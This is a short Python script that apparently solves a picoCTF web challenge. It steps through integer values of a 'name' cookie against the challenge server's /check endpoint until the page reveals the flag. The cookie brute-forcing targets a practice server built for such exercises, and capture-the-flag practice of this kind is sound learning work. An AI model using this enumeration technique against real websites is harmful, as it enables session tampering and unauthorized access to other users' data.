from bs4 import BeautifulSoup
import requests

# URL Website PicoCTF
url = 'http://mercury.picoctf.net:64944/search'
i = 1
while (True):
    cookies = {'name': str(i)}
    res = requests.get(url='http://mercury.picoctf.net:64944/check', cookies=cookies)
    soup = BeautifulSoup(res.text, "html.parser")
    find = soup.find_all("code")
    flag = str(len(find)>0)
    print(flag,"Cookies Value : ", i)
    i = i + 1
    if (flag == 'True'):
        print(find)
        break
    